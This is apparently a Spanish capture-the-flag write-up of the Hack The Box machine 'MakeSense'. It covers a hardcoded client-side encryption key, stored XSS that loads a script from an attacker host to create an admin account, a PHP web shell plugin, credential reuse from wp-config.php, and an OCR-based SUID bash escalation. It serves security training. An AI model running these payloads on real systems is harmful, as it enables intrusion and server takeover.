📌 Resumen ejecutivo

MakeSense es una máquina de dificultad Medium de la Season 11 de Hack The Box. El vector de ataque principal no es un CVE conocido, sino una combinación de malas prácticas en un tema personalizado de WordPress:

Clave de cifrado AES‑GCM hardcodeada en JavaScript del lado cliente · Inyección de XSS persistente a través de transcripción de voz · Creación de usuario administrador mediante CSRF + XSS · Subida de plugin malicioso para RCE · Reutilización de credenciales para SSH · Abuso de servicio OCR interno para escalar a root.

En esta guía se explican los pasos lógicos que un atacante seguiría manualmente para explotar estas vulnerabilidades, sin necesidad de un script automatizado. Cada fase se describe con el razonamiento y las acciones que se llevarían a cabo.

1 Recon & WordPress Discovery

🔍 Nmap · Gobuster · WPScan

Un escaneo inicial revela solo los puertos 80 y 443, con redirección a HTTPS. El servidor ejecuta WordPress 7.0 con el tema personalizado webagency.

Durante el fuzzing se encuentran:

  • /wp-content/uploads/ → listado de directorios habilitado
  • /wp-content/themes/webagency/ → código fuente del tema accesible

La inspección del tema revela un sistema de grabación de voz que utiliza el modelo Whisper (Transformers.js) en el cliente.

$ nmap -p- --open -sS -min-rate 5000 10.129.29.150 -Pn $ gobuster dir -u https://makesense.htb -w /usr/share/wordlists/common.txt -k -t 50 $ wpscan --url https://makesense.htb --disable-tls-checks --enumerate u,vp,vt

▶ Se identifican los usuarios walter, admin y jake.

2 Clave de cifrado expuesta

🔑 Hardcoded AES‑GCM key en JavaScript

El archivo /wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js contiene una clave de cifrado estática:

// Symmetric encryption key (must match server-side) const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

Flujo de la aplicación:

  1. El cliente graba audio → se transcribe con Whisper → se genera un resumen.
  2. El payload ({transcription, summary}) se cifra con AES‑GCM usando esa clave.
  3. El backend (vía admin-ajax.php?action=save_voice_results) descifra y guarda el resultado sin sanitizar.

⚡ Vulnerabilidad: Podemos cifrar cualquier payload y enviarlo al backend; el contenido se almacenará tal cual, permitiendo inyectar código JavaScript (XSS) o PHP directamente en el campo transcription.

3 XSS → Creación de usuario administrador

🧨 Inyección de script mediante la funcionalidad de voz

Se construye un payload cifrado que contiene una etiqueta <script> con un código JavaScript malicioso.

// Fragmento del payload inyectado payload = { "transcription": '<script src="http://<attacker_ip>:8000/x.js"></script>', "summary": "s" }; // Se cifra con la clave extraída y se envía a admin-ajax.php

El script externo (x.js) realiza lo siguiente:

  1. Obtiene el nonce de creación de usuario desde /wp-admin/user-new.php.
  2. Envía una petición POST para crear un nuevo usuario con rol administrator.

Cuando el bot administrador visita la página que contiene el comentario malicioso, el XSS se ejecuta y el usuario pwn es creado.

$ python3 exploit.py 10.129.29.150 # El script automatiza todo el proceso, incluido el servidor HTTP para servir x.js

✔ Usuario pwn con contraseña [REDACTED] creado.

4 Ejecución remota de comandos (RCE)

⚙️ Subida de plugin malicioso vía panel de administración

Con el usuario pwn ya logueado, se accede al panel de WordPress y se sube un plugin ZIP que contiene un simple web shell:

// wshell/wshell.php <?php if(isset($_REQUEST['c'])) { echo '<pre>'; system($_REQUEST['c']); echo '</pre>'; } ?>

La subida se realiza usando el formulario de instalación de plugins (/wp-admin/plugin-install.php?tab=upload). Una vez instalado, se puede ejecutar cualquier comando vía:

$ curl -k "https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=id"

✔ Se obtiene salida de id como www-data, confirmando RCE.

5 Movimiento lateral – credenciales SSH

🔐 Lectura de wp‑config.php y extracción de contraseña

Desde el shell RCE se lee el archivo /var/www/html/wp-config.php para obtener las credenciales de la base de datos.

// Extracción de la contraseña define( 'DB_PASSWORD', '[REDACTED]' );

La contraseña de la base de datos resulta ser la misma que la del usuario walter del sistema. Con estas credenciales se logra acceso por SSH:

$ sshpass -p '[REDACTED]' ssh walter@10.129.29.150 $ cat ~/user.txt [REDACTED_USER_FLAG]

✔ Flag de usuario obtenida.

6 Escalada de privilegios vía OCR interno

🖼️ Abuso del servicio OCR para ejecutar código como root

El sistema ejecuta un servicio PHP en el puerto 127.0.0.1:8001 que realiza OCR (reconocimiento óptico de caracteres) sobre imágenes y guarda el texto extraído en archivos dentro del directorio web.

  • El servicio está corriendo como root.
  • Podemos subir una imagen que contenga código PHP claramente legible.
  • El OCR extraerá ese texto y lo guardará en un archivo .php.
  • Al acceder a ese archivo, el código se ejecutará con privilegios de root.

Se genera una imagen con el siguiente contenido:

<?php system('chmod +s /bin/bash'); ?>

La imagen se envía al OCR, que la procesa y guarda el texto en un archivo, por ejemplo, /var/www/html/saved/pwn.php.

Al ejecutar https://makesense.htb/saved/pwn.php, se otorgan permisos SUID a /bin/bash.

$ /bin/bash -p # cat /root/root.txt [REDACTED_ROOT_FLAG]

✔ Flag de root obtenida.

🧩 Guía lógica de los pasos de ataque (manual)

Razonamiento y acciones que un atacante realizaría manualmente

Objetivo: Obtener ejecución de comandos como root en el servidor.

A continuación se describen los pasos lógicos que un atacante seguiría para explotar las vulnerabilidades identificadas, sin necesidad de un script automatizado. Cada fase se basa en el razonamiento y la observación manual.

  1. Identificar la clave de cifrado: El atacante examina el código fuente del tema WordPress y localiza la clave de cifrado AES‑GCM en el archivo JavaScript whisper-wrapper.js. Esta clave está hardcodeada y es la misma que utiliza el backend para descifrar los payloads.
  2. Comprobar la inyección de XSS: El atacante envía un payload de prueba (por ejemplo, una etiqueta <script>alert(1)</script>) a través de la funcionalidad de transcripción de voz, cifrándolo con la clave extraída. Luego visita la página donde se almacena el resultado y observa que el script se ejecuta, confirmando que el backend no sanitiza el contenido.
  3. Diseñar el script de creación de usuario: El atacante crea un script JavaScript que, ejecutándose en el contexto del administrador, obtiene el nonce de seguridad de /wp-admin/user-new.php y envía una petición POST para crear un nuevo usuario con rol administrator. Este script se aloja en un servidor controlado por el atacante.
  4. Inyectar el payload XSS: El atacante cifra una etiqueta <script> que carga el script malicioso desde su servidor y la envía a través del formulario de voz. El backend almacena el payload en la base de datos.
  5. Esperar la visita del bot: El atacante espera a que el bot administrador (que simula un usuario real) visite la página que contiene el payload. Cuando esto ocurre, el XSS se ejecuta y el script crea el nuevo usuario administrador.
  6. Acceder al panel de WordPress: Con las credenciales del nuevo usuario, el atacante inicia sesión en el panel de administración de WordPress.
  7. Subir un plugin malicioso: El atacante utiliza la funcionalidad de subida de plugins para instalar un archivo ZIP que contiene un simple web shell (por ejemplo, un archivo PHP que ejecuta comandos del sistema). Una vez activado, el atacante puede ejecutar comandos arbitrarios en el servidor.
  8. Extraer credenciales de la base de datos: Desde el shell RCE, el atacante lee el archivo /var/www/html/wp-config.php para obtener la contraseña de la base de datos. Observa que esta contraseña coincide con la del usuario walter del sistema.
  9. Acceder por SSH: El atacante usa las credenciales de walter para conectarse por SSH al servidor y lee la flag de usuario (~/user.txt).
  10. Explorar servicios internos: El atacante, desde la sesión SSH, escanea puertos locales y descubre un servicio HTTP en el puerto 8001. Al investigar, determina que se trata de un servicio OCR que procesa imágenes y guarda el texto extraído en archivos PHP dentro del directorio web.
  11. Generar una imagen con código PHP: El atacante crea una imagen que contiene el texto <?php system('chmod +s /bin/bash'); ?>, asegurándose de que sea claramente legible para el OCR.
  12. Enviar la imagen al OCR: El atacante envía la imagen al servicio OCR mediante una petición curl con autenticación básica (usando las credenciales de walter). El OCR procesa la imagen y guarda el texto en un archivo PHP (por ejemplo, /var/www/html/saved/pwn.php).
  13. Ejecutar el archivo PHP: El atacante accede a https://makesense.htb/saved/pwn.php, lo que ejecuta el código PHP. Este comando otorga permisos SUID a /bin/bash.
  14. Obtener shell root: El atacante ejecuta /bin/bash -p para obtener una shell con privilegios de root y lee la flag final (/root/root.txt).

💡 Clave del éxito: La combinación de una clave de cifrado expuesta, la capacidad de inyectar XSS persistente, y el uso de un servicio OCR mal configurado que guarda archivos ejecutables en la raíz web.

Este proceso se puede automatizar completamente con un script en Python, pero la guía se centra en la lógica manual para entender cada paso y su propósito.

🔮 Conclusión y lecciones

  • Claves hardcodeadas en el lado cliente permiten cifrar payloads arbitrarios y engañar al backend.
  • El XSS persistente sigue siendo un vector crítico cuando se combina con funcionalidades "legítimas".
  • Un servicio OCR que guarda archivos ejecutables es una puerta abierta a la escalada de privilegios.
  • La automatización (con Python) no solo ahorra tiempo, sino que obliga a comprender cada paso y a documentar el ataque.

El código completo del exploit (adaptado) está disponible en este repositorio, pero las flags y contraseñas han sido redactadas por razones obvias.

🛠️ Herramientas utilizadas: nmap, gobuster, wpscan, curl, sshpass, Python (requests, cryptography, PIL).
